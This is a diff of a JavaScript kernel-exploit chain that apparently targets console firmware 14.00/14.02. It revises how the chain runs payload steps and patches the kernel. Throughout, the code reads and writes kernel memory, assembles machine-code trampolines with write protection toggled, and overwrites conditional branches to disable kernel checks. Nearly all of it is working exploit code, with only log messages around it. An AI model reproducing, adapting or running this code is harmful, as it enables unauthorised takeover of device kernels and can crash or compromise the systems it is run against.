@@ -1176,7 +1176,7 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 }
 
 
-/* Kpayload step-driver. 1402zk: the payload's firmware probe is bypassed,
+/* Kpayload step-driver. 1402zl: the payload's firmware probe is bypassed,
    not moved. 0x115be scans [base+0x1300000, +0x2200000) one byte at a time
    and that window opens in the unmapped hole above the RELRO segment here --
    one read is a panic. Nineteen sites across the payload call it, so the
@@ -1268,6 +1268,8 @@ async function loadKpayloadSteps(k, kbase, room) {
   }
   say("[kp] gate heartbeat " + text(hb) + ", firing step 1 next");
   await nap(300);
+  say("[kp] idle window spent, building tram");
+  await nap(250);
 
   let silent = 0;
   for (let n = 0; n < KP_MAX_STEPS; n++) {
@@ -1290,6 +1292,8 @@ async function loadKpayloadSteps(k, kbase, room) {
     hex("48b9"); q64(plus(buf, GH.mark)); hex("488901");
     hex("488b2424");               /* rsp = [rsp] */
     wpOn(); hex("31c0"); hex("c3");
+    say("[kp] tram built (" + tram.n + " bytes), firing now");
+    await nap(250);
     say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (host stack)");
     await nap(400);
     fire();
@@ -1314,7 +1318,7 @@ async function loadKpayloadSteps(k, kbase, room) {
     }
   }
 
-  say("[kp] step 1 returned cleanly -- 1402zk stops the chain here on purpose");
+  say("[kp] step 1 returned cleanly -- 1402zl stops the chain here on purpose");
   await nap(500);
   say("[kp] idle heartbeat 1 of 3 after step 1");
   await nap(700);
@@ -2416,6 +2420,8 @@ async function attempt(ctx, opts) {
 
 
   /* ---- resolve patch offsets for this firmware ------------------------- */
+  const applyList = [];
+  const skipped = [];
   {
     const SHIFTS = [0, 16, 768, 864, 880, 992, 1024, 1152, 1200, 1280];
     let adj = 0;
@@ -2423,43 +2429,64 @@ async function attempt(ctx, opts) {
       const off = PATCHES[i][0];
       const nb = unhex(PATCHES[i][1]);
       const cur = k.read(kat(off), nb.length);
-      if (cur && sameBytes(cur, nb)) continue;
+      if (cur && sameBytes(cur, nb)) { applyList.push(PATCHES[i]); continue; }
 
-      let expect1 = (nb[0] === 0xEB) ? 0x75 : -1;
-      if (nb[0] === 0x90 && nb.length > 1 && nb[1] === 0xE9) expect1 = 0x0F;
-
-      if (expect1 < 0) continue;
-      /* 14.02 compiles these stack-overlap checks as jbe (76) instead of
-         jne (75). Same meaning, same site: patching here is correct, so do
-         not go hunting for a shift that will never exist. */
-      if (cur && (cur[0] === expect1 || (expect1 === 0x75 && cur[0] === 0x76))) continue;
+      /* "eb" keeps the branch's displacement, so any conditional jump may be
+         forced. "eb04" writes its own displacement, so the live branch must
+         carry that same one. "eb00" falls through whatever the branch was. */
+      const jcc = !!cur && cur.length > 0 && cur[0] >= 0x70 && cur[0] <= 0x7f;
+      const forced = (nb.length > 1) ? nb[1] : -1;
+      if (nb[0] === 0xEB && jcc && (forced <= 0 || (cur.length > 1 && cur[1] === forced))) {
+        applyList.push(PATCHES[i]);
+        continue;
+      }
+      if (nb[0] === 0x90 && nb.length > 1 && nb[1] === 0xE9 && cur && cur.length > 1
+          && cur[0] === 0x0F && cur[1] >= 0x80 && cur[1] <= 0x8f) {
+        applyList.push(PATCHES[i]);
+        continue;
+      }
 
       let best = -1;
-      for (let s = 0; s < SHIFTS.length; s++) {
-        const t = k.read(kat(off + SHIFTS[s]), 1);
-        if (t && t[0] === expect1) { best = SHIFTS[s]; break; }
+      for (let s = 1; s < SHIFTS.length; s++) {
+        const t = k.read(kat(off + SHIFTS[s]), 2);
+        if (!t) continue;
+        if (nb[0] === 0xEB && t[0] >= 0x70 && t[0] <= 0x7f
+            && (forced <= 0 || t[1] === forced)) { best = SHIFTS[s]; break; }
+        if (nb[0] === 0x90 && t[0] === 0x0F && t[1] >= 0x80 && t[1] <= 0x8f) { best = SHIFTS[s]; break; }
       }
       if (best > 0) {
         say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16));
         PATCHES[i][0] = off + best;
+        applyList.push(PATCHES[i]);
         adj++;
       } else {
-        say("[7b] " + PATCHES[i][2] + " at 0x" + off.toString(16) + " unresolved");
+        /* Writing the 14.00 bytes where the firmware has no branch lands them
+           mid-instruction. In the 14.02 dump those six writes turned a `lea`
+           displacement at 0x628684 and the tail of a `je` at 0x1b7a53 into
+           wild jumps -- so the site is left untouched and recorded instead. */
+        const org = k.read(kat(off), 12);
+        let hs = "";
+        if (org) for (let j = 0; j < org.length; j++) hs += (org[j] < 16 ? "0" : "") + org[j].toString(16);
+        say("[7b] SKIP " + PATCHES[i][2] + " @0x" + off.toString(16)
+            + (hs ? (" live " + hs) : " unreadable"));
+        skipped.push(PATCHES[i][2]);
       }
     }
     if (adj > 0) say("[7b] adjusted " + adj + " patch offsets for this firmware");
+    say("[7b] " + applyList.length + " sites confirmed, " + skipped.length + " left untouched");
   }
 
-  if (!k.apply(kbase, PATCHES)) { return failOut("[8] the patch pass did not return"); }
+  if (!applyList.length) { return failOut("[8] no patch site could be confirmed -- stopping"); }
+  if (!k.apply(kbase, applyList)) { return failOut("[8] the patch pass did not return"); }
   let done = 0, failed = null;
-  for (let i = 0; i < PATCHES.length; i++) {
-    const bytes = unhex(PATCHES[i][1]);
-    const got = k.read(kat(PATCHES[i][0]), bytes.length);
-    if (got && sameBytes(got, bytes)) done++; else failed = failed || PATCHES[i][2];
+  for (let i = 0; i < applyList.length; i++) {
+    const bytes = unhex(applyList[i][1]);
+    const got = k.read(kat(applyList[i][0]), bytes.length);
+    if (got && sameBytes(got, bytes)) done++; else failed = failed || applyList[i][2];
   }
-  say("[8] " + done + " of " + PATCHES.length + " kernel patches in place"
+  say("[8] " + done + " of " + applyList.length + " confirmed kernel patches in place"
       + (failed ? (" -- first missing: " + failed) : ""));
-  if (done < PATCHES.length) { return failOut("     refusing to go on with a half patched kernel"); }
+  if (done < applyList.length) { return failOut("     refusing to go on with a half patched kernel"); }
 
   const proc = k.read_v(plus(thread, 0x08));
   const fdt = proc && k.read_v(plus(proc, 0x48));
@@ -2552,7 +2579,7 @@ async function attempt(ctx, opts) {
   if (mode === "kpstep") {
     iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
     if (STATE.haltChain) {
-      say("[kp] 1402zk diagnostic build -- stopping before the debug-settings pass");
+      say("[kp] 1402zl diagnostic build -- stopping before the debug-settings pass");
       return iface;
     }
   } else if (want !== "") {
